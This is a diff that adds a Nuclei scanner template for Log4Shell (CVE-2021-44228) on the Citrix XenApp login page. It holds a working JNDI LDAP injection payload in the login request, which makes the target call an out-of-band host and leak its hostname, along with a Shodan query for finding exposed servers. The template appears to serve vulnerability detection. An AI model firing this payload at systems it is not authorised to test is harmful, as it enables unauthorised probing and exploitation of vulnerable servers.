@@ -1,0 +1,68 @@
+id: citrix-xenapp-log4j-rce
+
+info:
+  name: Citrix XenApp - Remote Code Execution (Apache Log4j)
+  author: shaikhyaser
+  severity: critical
+  description: |
+    Citrix XenApp is susceptible to Log4j JNDI remote code execution. Citrix Virtual Apps is an application virtualization software produced by Citrix Systems that allows Windows applications to be accessed via individual devices from a shared server or cloud system.
+  reference:
+    - https://support.citrix.com/article/CTX335705
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+    cpe: cpe:2.3:a:citrix:xenapp:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 1
+    shodan-query: html:"/citrix/xenapp"
+    product: xenapp
+    vendor: citrix
+  tags: cve,cve2021,rce,jndi,log4j,citrix,oast,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+  str: "{{rand_base(5)}}"
+
+http:
+  - raw:
+      - |
+        POST /Citrix/XenApp/auth/login.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: WIClientInfo="clientConnSecure#false";
+        Origin: {{RootURL}}
+        Referer: {{RootURL}}/Citrix/XenApp/auth/login.aspx?CTX_MessageType=WARNING&CTX_MessageKey=NoUsableClientDetected
+        Content-Type: application/x-www-form-urlencoded
+
+        LoginType=Explicit&user=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&password={{str}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
+      - type: regex
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print injection point in output
+        part: interactsh_request
+
+      - type: regex
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+        part: interactsh_request
+# digest: 490a00463044022024ce9b4d0b77f7905806cb82b6033fd620d0fd7d1e31d3038b84fa11013b26da0220226353492f1db00aaad29244a9cad0750b1777a36b9aeffd906a9f4ec7f491c5:922c64590222798bb761d5b6d8e72950
